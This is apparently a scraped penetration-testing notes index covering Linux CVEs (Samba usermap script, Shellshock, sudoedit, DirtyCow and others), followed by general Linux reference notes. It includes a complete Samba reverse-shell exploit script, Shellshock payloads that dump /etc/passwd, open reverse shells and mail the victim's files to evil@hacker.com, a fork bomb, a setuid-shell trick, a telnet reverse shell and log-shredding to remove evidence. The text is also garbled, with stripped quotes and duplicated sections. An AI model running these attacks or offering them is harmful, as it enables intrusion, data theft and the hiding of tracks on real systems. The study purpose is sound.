a malicious file from the FTP server (to current dir) wget will fail to rename the file to the originally requested filename will not work with - O However, By saving .wgetrc in / home / victim / . wgetrc could set arbitrary wget settings such as destination directory Exploits https://www.exploit-db.com/exploits/40064 OpenSSH =6.6 SFTP misconfiguration Exploit https://github.com/SECFORCE/sftp-exploit References https://www.secforce.com/blog/2018/03/openssh_exploit_32_and_64_bit/ Practice HTB - Nightmare CVE-2007-2447 - (SMB) Samba 3.0.20 3.0.25rc3 Exploitable when using the non-default \"username map script\" configuration option. By specifying a username containing shell meta characters, attackers can execute arbitrary commands. Case study: https://amriunix.com/post/cve-2007-2447-samba-usermap-script/ exploit / multi / samba / usermap_script Exploits : https://github.com/amriunix/cve-2007-2447 #!/usr/bin/python # -*- coding: utf-8 -*- # From : https://github.com/amriunix/cve-2007-2447 # case study : https://amriunix.com/post/cve-2007-2447-samba-usermap-script/ import sys from smb.SMBConnection import SMBConnection def exploit ( rhost , rport , lhost , lport ): payload = mkfifo /tmp/hago; nc + lhost + + lport + 0 /tmp/hago | /bin/sh /tmp/hago 2 1; rm /tmp/hago username = /=`nohup + payload + ` conn = SMBConnection ( username , , , ) try : conn . connect ( rhost , int ( rport ), timeout = 1 ) except : print [+] Payload was sent - check netcat ! if __name__ == __main__ : print ( [*] CVE-2007-2447 - Samba usermap script ) if len ( sys . argv ) != 5 : print ( [-] usage: python + sys . argv [ 0 ] + RHOST RPORT LHOST LPORT ) else : print ( [+] Connecting ! ) rhost = sys . argv [ 1 ] rport = sys . argv [ 2 ] lhost = sys . argv [ 3 ] lport = sys . argv [ 4 ] exploit ( rhost , rport , lhost , lport ) Privilege Escalation CVE-2010-0832 - Linux PAM 1.1.X MOTD File Tampering pam_motd (aka the MOTD module) in libpam-modules Before 1.1.0-2ubuntu1.1 in PAM on Ubuntu 9.10 Before 1.1.1-2ubuntu5 in PAM on Ubuntu 10.04 LTS Change the ownership of arbitrary files via a symlink attack on .cache in a user's home directory. \"user file stamps\" and the motd . legal - notice file. Exploits https://www.exploit-db.com/exploits/14339 https://www.exploit-db.com/exploits/14273 https://twitter.com/jonoberheide/status/18009527979 Practice HTB - Popcorn CVE-2015-5602 - 'Sudoedit' Unauthorized Privilege Escalation RHEL /7 / Ubuntu Sudo = 1.8.14 When /etc/sudoers reads: user_to_grant_priv ALL = ( root ) NOPASSWD : sudoedit / home /*/*/test.txt Sudoedit does not check the full path if a wildcard is used twice (e.g. /home/ / /file.txt), Allowing a malicious user to replace the file.txt real file with a symbolic link to a different location (e.g. /etc/shadow). Example / home / user_to_grant_priv / newdir , test . txt pointing to / etc / shadow ln - sf / etc / shadow / home / user_to_grant_priv / newdir / test . txt Then do sudoedit / home / user_to_grant_priv / newdir / test . txt OR sudoedit - u user_to_grant_priv / home / user_to_grant_priv / newdir / test . txt https://github.com/t0kx/privesc-CVE-2015-5602/blob/master/exploit.sh Usages Expose /etc/shadow Expose \u200bauthorized_keys over HTTP cd / var / www / testing / writeup ln - s / home / alekos / . ssh / authorized_keys layout . html References https://www.exploit-db.com/exploits/37710 Practice https://github.com/t0kx/privesc-CVE-2015-5602 HTB - Jocker CVE-2016-7545 - SELinux sandbox escape When executing a program via the SELinux sandbox The nonpriv session can escape to the parent session By using the TIOCSTI ioctl to push characters into the terminal's input buffer #include unistd.h #include sys/ioctl.h int main () { char * cmd = id \\n ; while ( * cmd ) ioctl ( 0 , TIOCSTI , cmd ++ ); execlp ( /bin/id , id , NULL ); } $ gcc test . c - o test $ / bin / sandbox . / test id References https://seclists.org/oss-sec/2016/q3/606 CVE-2017-1000112 - UFO Linux kernel Ubuntu Trusty 4.4.0-* Ubuntu Xenial 4-8-0-* Ubuntu Xenial (16.04) 4.4.0-81 References https://www.openwall.com/lists/oss-security/2017/08/13/1 https://ricklarabee.blogspot.com/2017/12/adapting-poc-for-cve-2017-1000112-to.html Exploit https://github.com/xairy/kernel-exploits/tree/master/CVE-2017-1000112 Practice HTB - Nightmare CVE-2019-13272 - Linux kernel 5.1.17 - Unauthorized Access https://0day.life/exploit/0day-636.html?fbclid=IwAR3ZMXDf8TXs7Q_k5rgL8je4BKPPEgUb106uZEMGoxNgCs08y60KXstqOsY ptrace_link in kernel/ptrace.c mishandles the recording of the credentials of a process that wants to create a ptrace relationship allows local users to obtain root access SELinux deny_ptrace might be a usable workaround CVE-2017-6074 - Linux Kernel DCCP double free Double-free vulnerability in the Datagram Congestion Control Protocol (DCCP) Allows an unprivileged user to alter kernel memory from an unprivileged process or cause a denial of service. Applies to all Linux kernels since 2.6.18 (September 2006) - may have been first introduced as early as October 2005 The Datagram Congestion Control Protocol (DCCP) is designed to support streaming media and telephony. There is a weakness in the way that it freed SKB (socket buffer) resources if the IPV6_RECVPKTINFO option is enabled on the socket. The kernel believed that the memory was still in use by the SKB, allowing an unprivileged local user to write to the kernel's memory space, and then to have any code that was written executed within the kernel. References https://blog.cloudpassage.com/2017/02/23/vulnerability-linux-kernel-dccp/ Exploit https://github.com/xairy/kernel-exploits/tree/master/CVE-2017-6074 Practice HTB - Blocky DirtyCow - CVE-2016-5195 A race condition was found in the way the Linux kernel's memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings. Gain write access to otherwise read-only memory mappings. Exploit https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs https://github.com/FireFart/dirtycow/blob/master/dirty.c overlayfs Linux Kernel 3.13.0 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation: https://www.exploit-db.com/exploits/37292 Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - 'overlayfs' Local Privilege Escalation (1): https://www.exploit-db.com/exploits/39166 Linux Kernel 4.3.3 - 'overlayfs' Local Privilege Escalation (2): https://www.exploit-db.com/exploits/39230 Other Mempodipper compiled (Ubuntu 11 - gimmeroot.c) Ubuntu ( = 18.10) - Dirty Sock: https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html https://github.com/initstring/dirty_sock/ Ubuntu 14.04 and 16.04: (CVE-2017-1000112) https://cxsecurity.com/issue/WLB-2018010018 Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation (2) https://www.exploit-db.com/exploits/14339 HTB: Beep GNU Screen 4.5.0 - Local Privilege Escalation - https://www.exploit-db.com/exploits/41154 - Nice example for learning exploit writing CVE-2010-2961 - Ubuntu 10.04/10.10) - Local Privilege Escalation mountall.c in mountall before 2.15.2 uses 0666 permissions for the root.rules file, which allows local users to gain privileges by modifying this file. http://www.outflux.net/blog/archives/2010/10/13/mountall-umask/ https://www.ethicalhacker.net/features/root/tutorial-hacking-linux-with-armitage/","title":"Linux issues"},{"location":"linux-issues/#collections","text":"https://github.com/lucyoa/kernel-exploits","title":"Collections"},{"location":"linux-issues/#exploits","text":"","title":"Exploits"},{"location":"linux-issues/#cve-2014-6271-shellshock","text":"Bash 4 . 3 and earlier Execute commands from environment variables unintentionally. Caused by Bash processing trailing strings after function definitions in the values of environment variables. Exploitable when attacker has control of environment variables. https://fedoramagazine.org/shellshock-how-does-it-actually-work/ GET http :// shellshock . testsparker . com / cgi-bin / netsparker . cgi HTTP / 1 . 1 User-Agent : Netsparker Host : shellshock . testsparker . com Referer : () { : ;} ; echo NS: $( / etc / passwd ) Test if Vulnerable env x = () { :;}; echo OOPS bash -c : env x = () { :;}; echo vulnerable bash -c echo not-vulnerable Explanation To run a command in a new shell bash -c ls New shell inherits environment If new shell finds what seems to be a function in an environment variable: New shell executes the function to get the actual value When function is executed, evaluation didn't stop when the end of the function definition is reached. Hence, when new shell sees () { :; } ; , bash will start executing the function and proceed to also execute the echo . Samples Passwd curl -A () { :;}; echo Content-Type: text/plain ; echo; /bin/cat /etc/passwd http://192.168.1.14/cgi-bin/status curl -H user-agent: () { :; }; echo; echo; /bin/bash -c cat /etc/passwd \\ http://192.168.1.14/cgi-bin/status Directory Listing curl -A () { :;}; echo Content-Type: text/plain ; echo; /bin/ls / http://192.168.1.14/cgi-bin/status Reverse shell curl -A () { :; }; /bin/bash -c /usr/bin/nc -lvvp 2345 -e /bin/bash http://192.168.1.14/cgi-bin/status curl -H User-Agent: () { :; }; /bin/bash -i /dev/tcp/10.10.14.203/1234 0 1 http://10.10.10.56/cgi-bin/user.sh Setuid shell: () { :; } ; cp / bin / bash / tmp / bash chmod 4755 / tmp / bash Fork Bomb: () { :; } ; :() { : | : } ;: Ping Bot: () { :; } ; ping - s 1000000 victim IP Data Theft: () { : ; } ; find ~ - print | mail - s Your files evil @hacker . com () { : ; } ; cat ~/ . secret / passwd | mail - s This password file evil @hacker . com Exploitation Vectors https://github.com/opsxcq/exploit-CVE-2014-6271 CGI Bash will receive the environment variables passed by the server Server passes various details of the request to a handler program in the environment variable list. For example, HTTP_USER_AGENT . exploit / multi / http / apache_mod_cgi_bash_env_exec Apache mod_cgi - 'Shellshock' Remote Command Injection OpenSSH ForceCommand will execute a fixed command on login If user specify a command to run, user specific command is put into environment ( SSH_ORIGINAL_COMMAND ) Bash will parse SSH_ORIGINAL_COMMAND on start-up, and run the commands DHCP clients Some DHCP clients can also pass commands to Bash Malicious DHCP server provide, a string crafted to execute code (in an addition option) Qmail server Qmail mail server passes external input through in a way that can exploit a vulnerable version of Bash. IBM HMC restricted shell References Shellshock: How does it actually work? [Related Issues+] ShellShock: All you need to know about the Bash Bug vulnerability Practice https://pentesterlab.com/exercises/cve-2014-6271 [Docker] Shellshock exploit + vulnerable environment HTB - Shocker","title":"CVE-2014-6271 - Shellshock"},{"location":"linux-issues/#cve-2014-7169","text":"","title":"CVE-2014-7169"},{"location":"linux-issues/#cve-2014-0160-heartbleed","text":"Exploits https://github.com/sensepost/heartbleed-poc https://gist.github.com/eelsivart/10174134 References https://fedoramagazine.org/update-on-cve-2014-0160-aka-heartbleed/","title":"CVE-2014-0160 - Heartbleed"},{"location":"linux-issues/#cve-2016-4971-gnu-wget-118-arbitrary-file-upload-remote-code-execution","text":"issuing a crafted HTTP 30X Redirect containing FTP server reference in response wget will automatically follow the redirect wget will download a malicious file from the FTP server (to current dir) wget will fail to rename the file to the originally requested filename will not work with - O However, By saving .wgetrc in / home / victim / . wgetrc could set arbitrary wget settings such as destination directory Exploits https://www.exploit-db.com/exploits/40064","title":"CVE-2016-4971 - GNU Wget &lt; 1.18 - Arbitrary File Upload / Remote Code Execution"},{"location":"linux-issues/#openssh-66-sftp-misconfiguration","text":"Exploit https://github.com/SECFORCE/sftp-exploit References https://www.secforce.com/blog/2018/03/openssh_exploit_32_and_64_bit/ Practice HTB - Nightmare","title":"OpenSSH &lt;=6.6 SFTP misconfiguration"},{"location":"linux-issues/#cve-2007-2447-smb-samba-3020-3025rc3","text":"Exploitable when using the non-default \"username map script\" configuration option. By specifying a username containing shell meta characters, attackers can execute arbitrary commands. Case study: https://amriunix.com/post/cve-2007-2447-samba-usermap-script/ exploit / multi / samba / usermap_script Exploits : https://github.com/amriunix/cve-2007-2447 #!/usr/bin/python # -*- coding: utf-8 -*- # From : https://github.com/amriunix/cve-2007-2447 # case study : https://amriunix.com/post/cve-2007-2447-samba-usermap-script/ import sys from smb.SMBConnection import SMBConnection def exploit ( rhost , rport , lhost , lport ): payload = mkfifo /tmp/hago; nc + lhost + + lport + 0 /tmp/hago | /bin/sh /tmp/hago 2 1; rm /tmp/hago username = /=`nohup + payload + ` conn = SMBConnection ( username , , , ) try : conn . connect ( rhost , int ( rport ), timeout = 1 ) except : print [+] Payload was sent - check netcat ! if __name__ == __main__ : print ( [*] CVE-2007-2447 - Samba usermap script ) if len ( sys . argv ) != 5 : print ( [-] usage: python + sys . argv [ 0 ] + RHOST RPORT LHOST LPORT ) else : print ( [+] Connecting ! ) rhost = sys . argv [ 1 ] rport = sys . argv [ 2 ] lhost = sys . argv [ 3 ] lport = sys . argv [ 4 ] exploit ( rhost , rport , lhost , lport )","title":"CVE-2007-2447 - (SMB) Samba 3.0.20 &lt; 3.0.25rc3"},{"location":"linux-issues/#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"linux-issues/#cve-2010-0832-linux-pam-11x-motd-file-tampering","text":"pam_motd (aka the MOTD module) in libpam-modules Before 1.1.0-2ubuntu1.1 in PAM on Ubuntu 9.10 Before 1.1.1-2ubuntu5 in PAM on Ubuntu 10.04 LTS Change the ownership of arbitrary files via a symlink attack on .cache in a user's home directory. \"user file stamps\" and the motd . legal - notice file. Exploits https://www.exploit-db.com/exploits/14339 https://www.exploit-db.com/exploits/14273 https://twitter.com/jonoberheide/status/18009527979 Practice HTB - Popcorn","title":"CVE-2010-0832 - Linux PAM 1.1.X MOTD File Tampering"},{"location":"linux-issues/#cve-2015-5602-sudoedit-unauthorized-privilege-escalation","text":"RHEL /7 / Ubuntu Sudo = 1.8.14 When /etc/sudoers reads: user_to_grant_priv ALL = ( root ) NOPASSWD : sudoedit / home /*/*/test.txt Sudoedit does not check the full path if a wildcard is used twice (e.g. /home/ / /file.txt), Allowing a malicious user to replace the file.txt real file with a symbolic link to a different location (e.g. /etc/shadow). Example / home / user_to_grant_priv / newdir , test . txt pointing to / etc / shadow ln - sf / etc / shadow / home / user_to_grant_priv / newdir / test . txt Then do sudoedit / home / user_to_grant_priv / newdir / test . txt OR sudoedit - u user_to_grant_priv / home / user_to_grant_priv / newdir / test . txt https://github.com/t0kx/privesc-CVE-2015-5602/blob/master/exploit.sh Usages Expose /etc/shadow Expose \u200bauthorized_keys over HTTP cd / var / www / testing / writeup ln - s / home / alekos / . ssh / authorized_keys layout . html References https://www.exploit-db.com/exploits/37710 Practice https://github.com/t0kx/privesc-CVE-2015-5602 HTB - Jocker","title":"CVE-2015-5602 - 'Sudoedit' Unauthorized Privilege Escalation"},{"location":"linux-issues/#cve-2016-7545-selinux-sandbox-escape","text":"When executing a program via the SELinux sandbox The nonpriv session can escape to the parent session By using the TIOCSTI ioctl to push characters into the terminal's input buffer #include unistd.h #include sys/ioctl.h int main () { char * cmd = id \\n ; while ( * cmd ) ioctl ( 0 , TIOCSTI , cmd ++ ); execlp ( /bin/id , id , NULL ); } $ gcc test . c - o test $ / bin / sandbox . / test id References https://seclists.org/oss-sec/2016/q3/606","title":"CVE-2016-7545 - SELinux sandbox escape"},{"location":"linux-issues/#cve-2017-1000112-ufo-linux-kernel","text":"Ubuntu Trusty 4.4.0-* Ubuntu Xenial 4-8-0-* Ubuntu Xenial (16.04) 4.4.0-81 References https://www.openwall.com/lists/oss-security/2017/08/13/1 https://ricklarabee.blogspot.com/2017/12/adapting-poc-for-cve-2017-1000112-to.html Exploit https://github.com/xairy/kernel-exploits/tree/master/CVE-2017-1000112 Practice HTB - Nightmare","title":"CVE-2017-1000112 - UFO Linux kernel"},{"location":"linux-issues/#cve-2019-13272-linux-kernel-5117-unauthorized-access","text":"https://0day.life/exploit/0day-636.html?fbclid=IwAR3ZMXDf8TXs7Q_k5rgL8je4BKPPEgUb106uZEMGoxNgCs08y60KXstqOsY ptrace_link in kernel/ptrace.c mishandles the recording of the credentials of a process that wants to create a ptrace relationship allows local users to obtain root access SELinux deny_ptrace might be a usable workaround","title":"CVE-2019-13272 - Linux kernel 5.1.17 - Unauthorized Access"},{"location":"linux-issues/#cve-2017-6074-linux-kernel-dccp-double-free","text":"Double-free vulnerability in the Datagram Congestion Control Protocol (DCCP) Allows an unprivileged user to alter kernel memory from an unprivileged process or cause a denial of service. Applies to all Linux kernels since 2.6.18 (September 2006) - may have been first introduced as early as October 2005 The Datagram Congestion Control Protocol (DCCP) is designed to support streaming media and telephony. There is a weakness in the way that it freed SKB (socket buffer) resources if the IPV6_RECVPKTINFO option is enabled on the socket. The kernel believed that the memory was still in use by the SKB, allowing an unprivileged local user to write to the kernel's memory space, and then to have any code that was written executed within the kernel. References https://blog.cloudpassage.com/2017/02/23/vulnerability-linux-kernel-dccp/ Exploit https://github.com/xairy/kernel-exploits/tree/master/CVE-2017-6074 Practice HTB - Blocky","title":"CVE-2017-6074 - Linux Kernel DCCP double free"},{"location":"linux-issues/#dirtycow-cve-2016-5195","text":"A race condition was found in the way the Linux kernel's memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings. Gain write access to otherwise read-only memory mappings. Exploit https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs https://github.com/FireFart/dirtycow/blob/master/dirty.c","title":"DirtyCow - CVE-2016-5195"},{"location":"linux-issues/#overlayfs","text":"Linux Kernel 3.13.0 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation: https://www.exploit-db.com/exploits/37292 Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - 'overlayfs' Local Privilege Escalation (1): https://www.exploit-db.com/exploits/39166 Linux Kernel 4.3.3 - 'overlayfs' Local Privilege Escalation (2): https://www.exploit-db.com/exploits/39230","title":"overlayfs"},{"location":"linux-issues/#other","text":"Mempodipper compiled (Ubuntu 11 - gimmeroot.c) Ubuntu ( = 18.10) - Dirty Sock: https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html https://github.com/initstring/dirty_sock/ Ubuntu 14.04 and 16.04: (CVE-2017-1000112) https://cxsecurity.com/issue/WLB-2018010018 Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation (2) https://www.exploit-db.com/exploits/14339 HTB: Beep GNU Screen 4.5.0 - Local Privilege Escalation - https://www.exploit-db.com/exploits/41154 - Nice example for learning exploit writing CVE-2010-2961 - Ubuntu 10.04/10.10) - Local Privilege Escalation mountall.c in mountall before 2.15.2 uses 0666 permissions for the root.rules file, which allows local users to gain privileges by modifying this file. http://www.outflux.net/blog/archives/2010/10/13/mountall-umask/ https://www.ethicalhacker.net/features/root/tutorial-hacking-linux-with-armitage/","title":"Other"},{"location":"linux/","text":"Quick Reference Bash cheatsheet: https://devhints.io/bash.html Archiving/compressing: https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-archiving-compressing-files-0166153/ General Information System Information cat /proc/net/dev lspci ip link show ip addr show lscpu cat /proc/cpuinfo File information: file filename Shared library dependencies: ldd filename Searching: With database: updatedb ; locate sbd . exe Within PATH: which sbd whereis sdb Complex: find / -\u00ad\u2010name sbd* find / --name sdb* --exec file {} \\; Search for hidden (dot) files find / - type d - name .* Mounting Devices: mount -t filesystemtype location mount -t /dev/cdrom /media umount /dev/cdrom Distribution cat / etc / issue cat / etc /*-release cat /etc/lsb-release ### Debian based cat /etc/redhat-release ### Redhat based Environment cat / etc / profile cat / etc / bashrc cat ~/ . bash_profile cat ~/ . bashrc cat ~/ . bash_logout env set Printers: lpstat - a Sys calls: / usr / include / i386 - linux - gnu / asm / unistd_32 . h New line in command line $ echo abc[CTRL+M] def Change password (one liner): echo root : password | / usr / sbin / chpasswd Bash Variables: $ 0 - The name of the Bash script $ 1 - $9 - The first 9 arguments to the Bash script $ # - Number of arguments passed to the Bash script $ @ - All arguments passed to the Bash script $ ? - The exit status of the most recently run process $$ - The process ID of the current script $ USER - The username of the user running the script $ HOSTNAME - The hostname of the machine $ RANDOM - A random number $ LINENO - The current line number in the script Cron: Shortcuts: @yearly @annually @monthly @weekly @daily @midnight @noon @reboot Logging locate rsyslog Config: / etc / rsyslog . conf Rotation: / etc / logrotate . conf Removing evidence: shred - f - n 10 / var / log / auth . log . * Disable: service rsyslog stop Kernel eBPF is a revolutionary technology that can run sandboxed programs in the Linux kernel without changing kernel source code or loading kernel modules. By making the Linux kernel programmable, infrastructure software can leverage existing layers, making them more intelligent and feature-rich without continuing to add additional layers of complexity to the system.: https://ebpf.io/ To communicate with the kernel, different UNIX systems use different interfaces https://opensource.com/article/19/3/virtual-filesystems-linux Source of VFS: https://www.tldp.org/LDP/khg/HyperNews/get/fs/vfstour.html filesystem, must implement the open(), read(), and write() methods kernel treats the generic filesystem as an abstract interface, and these big-three functions are \"virtual,\" with no default definition filesystems like ext4, NFS, and /proc all provide definitions of the big-three functions in a C-language data structure called file_operations filesystems extend and override the VFS functions in the familiar object-oriented way The function definitions that belong to the VFS base type itself are found in the fs/*.c files in kernel source, while the subdirectories of fs/ contain the specific filesystems. https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/fs Listing VFSs: mount | grep - v sd | grep - v : / tempfs (/tmp) https://wiki.archlinux.org/index.php/Tmpfs By default, a tmpfs partition has its maximum size set to half of the available RAM Under systemd, /tmp is automatically mounted as a tmpfs even though no entry is specified in /etc/fstab. tmp . mount systemd unit. procfs (/proc) https://man7.org/linux/man-pages/man5/procfs.5.html a snapshot into the instantaneous state of the kernel and the processes that it controls for userspace special in-memory filesystem used to present process information, kernel processes and other system information in a hierarchical file-like structure This layer is expected to provide convenient access to the said information, acting as an interface to internal data structures in the kernel / proc / sys is where the settings that are configurable via the sysctl command are accessible to userspace File sizes are zero (/proc/meminfo). The truth is that the kernel gathers statistics about memory when a process requests them from /proc Structure: https://www.thegeekdiary.com/understanding-the-proc-file-system/ https://en.wikipedia.org/wiki/Procfs#Linux http://www.noah.org/wiki//proc Implementation details: https://www.kernel.org/doc/Documentation/filesystems/proc.txt https://elixir.bootlin.com/linux/v5.8-rc4/source/fs/proc https://github.com/torvalds/linux/tree/master/fs/proc Important items: / proc / PID / cmdline : which contains the command which originally started the process Read confidential information passed in as arguments / proc / PID / environ : a file containing the names and contents of the environment variables that affect the process Read confidential information passed in as environment variables (specially useful in containerized environments, since this is a common practice) / proc / PID / mem : a binary image representing the process's virtual memory, can only be accessed by a ptrace'ing process Useful in dumping process memory , but with limitations / proc / PID / maps : the memory map showing which addresses currently visible to that process are mapped to which regions in RAM or to files Useful in binary exploitation (offset calculations, etc.) / proc / cpuinfo : containing information about the CPU Identifying CPU architecture. Useful in binary exploitations to create matching payloads. / proc / version : containing the Linux kernel version, distribution number, gcc version number used to build the kernel and any other pertinent information relating to the version of the kernel currently running Identifying operating system related information architecture. Useful in binary exploitations to create matching payloads. / proc / net / : a directory containing useful information about the network stack, in particular /proc/net/nf_conntrack, which lists existing network connections Get information about network stack and connections. / proc / modules : containing a list of the kernel modules currently loaded . It gives some indication (not always entirely correct) of dependencies. Useful in binary exploitations to create matching payloads. / proc / mounts : a symlink to self/mounts which contains a list of the currently mounted devices and their mount points Get information about the mounted devices (for example: through LFI) / proc / kcore : represents the physical memory of the system (kernel virtual address space region of memory) and is stored in the ELF core file format. (examined by gdb, objdump) / dev / kmem : gives access to the kernel's virtual memory space / dev / mem : gives access to physical memory. / proc / kmsg : used to hold messages generated by the kernel (picked by /bin/dmesg). Sysfs Structured approach to clean-up procfs expose the readable and writable properties of what the kernel calls \"kobjects\" to userspace purpose of kobjects is reference-counting: when the last reference to a kobject is deleted, the system will reclaim the resources associated with it https://www.kernel.org/doc/Documentation/kobject.txt constitutes most of the kernel's famous \" stable ABI to userspace \" which no one may ever, under any circumstances, \"break.\" eBPF (extended Berkeley Packet Filter) consists of a virtual machine running inside the kernel that privileged users can query from the command line running eBPF tools on a booted system shows instead what the kernel actually does https://github.com/iovisor/bcc/tree/master/tools vfscount or vfsstat Used by udev to access device and device driver information Sysfs helped clean up the proc file system because much of the hardware information has been moved from proc to sysfs Important items: /sys/bloc: information about block devices /sys/bus: physical bus type supported in the kernel /sys/class: devices classes registered /sys/devices: global device hierarchy of all devices on the system /sys/firmware: firmware objects and attributes /sys/module: subdirectories for each module that is loaded into the kernel /sys/power: system power state can be controlled from this directory. sysctl Usable to change values in / proc / sys directory View current kernel configuration: sysctl - a echo 1 / proc / sys / net / ipv4 / ip_forward sysctl - w net . ipv4 . ip_forward = 1 To make permanent changes, add to / etc / sysctl . conf General information: cat / proc / version uname - a uname - mrs rpm - q kernel dmesg | grep Linux ls / boot | grep vmlinuz - Kernel tuning: Temporary: sysctl sysctl - w net . ipv4 . ip_forward = 1 Permanent: / etc / sysctl . conf View configuration: sysctl - a | less View configuration files for the installed modprobe modules: ls - l / etc / modprobe . d / ls - R / lib / modules / $ ( uname - r ) / kernel Kernel Modules: loadable kernel modules, or LKMs. - Linux has the capability of adding some modules to the kernel without going through rebuilding kernel rootkit embeds itself into the kernel of the operating systems, often through these LKMs Insert module: insmod modprobe - a module name Remove module: modprobe - r module name rmmod List modules: modprobe - l module name lsmod Module info: modinfo bluetooth View logs: dmesg Solaris (IOCTLs) are used for communication between user-mode applications and the kernel List IOCTLs on Solaris Kernel: cd on - src / usr / src / uts grep - rnw - e _IOR - e _IOW - e _IOWR * Startup Process https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-using-start-up-scripts-0168875/ Run levels 0 - halt the system 1 - single user mode ( minimal services ) 2 - multi - user mode 3 - multi - user mode 4 - multi - user mode 5 - multi - user mode 6 - reboot the system Init.d Process Has process ID: 1 / etc / init . d scripts with 755 permission init process then hands over the boot-up processes to rc . d daemon rc.local - Script to start necessary processes in the background when the system boots up: / etc / init . d / rc . local You can add services for the rc.d script to run at startup using the update-rc.d command. update - rc . d name of the script or service remove | defaults | disable | enable update - rc . d postgresql defaults Run at startup GUI for startup tasks: rcconf Daemons inetd , xinetd - Inetd always runs in the background and it then decides when to start and stop other daemons. rlinetd rlinetd . conf / etc / rlinetd . d Disable unnecessary demons Configure IPs that can access a demon Managing Disks Managing Hard Disks hda for hard disks. sda for newer SATA disks (SCSI). Partitions within sda are sda1 , sda2 , ... Basic disk Information: df - h Partitions on disk: fdsisk - l Block device information: lsblk Editing and displaying partitions: parted / cfdisk ( parted ) print ( parted ) select / dev / sdb Change HDD parameters: hdparm Information about mounts: df - h Check errors: fsck after umount . - p to auto fix. Debugfs Simple-to-use RAM-based file system specially designed for debugging purposes Mount file system (usable to access / root by only being in disk group) debugfs / dev / sda1 dd if =/ dev / sdb of =/ root / flashcopy (block size 512) dd if =/ dev / media of =/ root / flashcopy bs = 4096 conv : noerror Permissions Linux automatically assigns base permissions\u2014usually 666 for files and 777 for directorie umask method represents the permissions you want to remove from the base permissions on a file or directory to make them more secure umask number is subtracted from the permissions number to give the new permissions status Debian systems, the umask is preconfigured to 022 644 for files 755 for directories File Permissions: 0 = No Permission 1 = Execute 2 = Write 4 = Read r w x 4 2 1 = 7 Setuid - Set User ID - The process's effective user ID gets set to that of the program file itself (rather than that of the user running it). S - just the setuid bit s - setuid bit and execute x Dir - No effect on DIRs Find SUID: find . - perm / 4000 Setgid - Set Group ID - The process's effective group ID gets set to that of the program file (rather than that of the user's primary group). Dir - any files created in that directory will have the same group as that directory http://www.tutonics.com/2012/12/linux-file-permissions-chmod-umask.html Find GUID: find . - perm / 2000 Find SUID / SGID: find . - perm / 6000 Find and ls SUID / SGID: find $DIRECTORY - perm / 6000 - exec ls - la {} \\ ; Searching world writable files: find / - perm - w ~ - type l - ls 2 ?/ dev / null Check file permissions of / etc / passwd and / etc / shadow Find writable files: find - type f - maxdepth 1 - writable Processes Running processes: ps aux ps - ef top Tree of processes (processes threads): pstree - aclp Process priority: nice - n - 20 command renice nice - value pid - 20 is highest priority 19 is lowest priority Memory map for a process: cat / proc / 1234 / maps gdb info proc mappings pmap - d 1234 / proc - / proc / id / environ environment variables - / proc / id / cmdline command line args/command used to run the process - / proc / id / maps memory map - / proc / id / fd open file descriptors Trace system and library calls ltrace strace Access control access - Check permissions for the UID and GID of the process (executable file owner / group) Check is done using the calling process's real UID and GID, rather than the effective IDs as is done when actually attempting an operation (e.g., open(2)) on the file. Process ID of a port: fuser - n tcp ( PORT NUMBER ) ps aux | grep $ ( fuser - n tcp 45295 | awk {print $2} ) Services List of Services: cat / etc / services Commons service configurations cat / etc / syslog . conf cat / etc / chttp . conf cat / etc / lighttpd . conf cat / etc / cups / cupsd . conf cat / etc / inetd . conf cat / etc / apache2 / apache2 . conf cat / etc / my . conf cat / etc / httpd / conf / httpd . conf cat / opt / lampp / etc / httpd . conf ls - aRl / etc / | awk $ 1 ~ /^ . * r . */ Check if certain service is up: update - \u00ad\u2010 rc . d ssh enable Auto start a service: update - \u00ad\u2010 rc . d ssh enable Systemd services: / lib / systemd / system / snapd . service Systemd socket unit file: [Socket] ListenStream = /run/snapd.socket ListenStream = /run/snapd-snap.socket SocketMode = 0666 0666 - Allow any process to connect and communicate with the socket. Networking Interface Information / sbin / ifconfig - a cat / etc / network / interfaces cat / etc / sysconfig / network Network configuration cat / etc / resolv . conf cat / etc / sysconfig / network cat / etc / networks iptables - L hostname dnsdomainname Monitor network communication lsof - i lsof - i : 80 grep 80 / etc / services netstat - antup netstat - antpx netstat - tulpn chkconfig --list chkconfig --list | grep 3:on last w Cached IP and Mac Information arp - e route / sbin / route - nee Change IP ifconfig eth0 192 . 168 . 1 . 115 ifconfig eth0 192 . 168 . 1 . 115 netmask 255 . 255 . 255 . 0 broadcast 192 . 168 . 1 . 255 Shell with built-in tools nc - lvp 4444 ### Attacker . Input ( Commands ) nc - lvp 4445 ### Attacker . Ouput ( Results ) telnet [ atackers ip ] 44444 | / bin / sh | [ local ip ] 44445 ### On the targets system . Use the attackers IP ! https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/ AF_UNIX - Used to communicate between processes on the same machine AF_INET and AF_INET6 - Used for processes to communicate over a network connection. Interact with AF_UNIX Socket nc - U / run / snapd . socket GET / HTTP / 1 . 1 Host : 127 . 0 . 0 . 1 Process ID of a port: fuser - n tcp ( PORT NUMBER ) ps aux | grep $ ( fuser - n tcp 45295 | awk {print $2} ) Tools Ship - one-stop-shop for basic network reconnaissance and addressing: https://github.com/xtonousou/ship.git https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-using-ship-for-quick-handy-ip-address-information-0181593/ Tools grep Color word root: grep --color root /etc/passwd OR: grep - e how - e to - e forge * . txt https://www.howtoforge.com/tutorial/linux-grep-command/ Option Details - i Ignore case - r - R Recursive grep - R example / etc / apache2 / - w Match words - e Regex match grep - w - e 